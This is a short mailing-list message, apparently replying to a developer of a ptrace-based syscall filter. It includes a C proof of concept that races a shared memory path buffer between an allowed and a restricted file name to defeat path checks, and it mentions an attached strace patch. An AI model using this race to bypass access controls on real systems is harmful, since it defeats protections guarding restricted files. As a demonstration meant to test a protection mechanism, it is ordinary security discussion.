Hi!

I'll take a look (really, I'm doing something pretty close as my
diploma thesis). Meanwhile: take a look at this program. It is _very_
nasty, and I guess it is able to bypass your protection (Imagine you
want to restrict access to /heslo, but leave access to /reklama open.)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
void
main(void)
{
  char *c = 0x94000000;
  open( "/tmp/delme", O_RDWR );
  mmap( c, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED, 3, 0 );
  *c = 0;
  if (fork()) {
    while(1) {
      strcpy( c, "/reklama" );    
      strcpy( c, "/heslo" );
    }
  } else
    while (1)
      open( c, 0 );
}

When I was faced with this task, I added ability to strace to ask if
it should do syscalls. Patch is rather small and attached. If there's
enough interest, I might even be able to push -y option into standart
distribution.
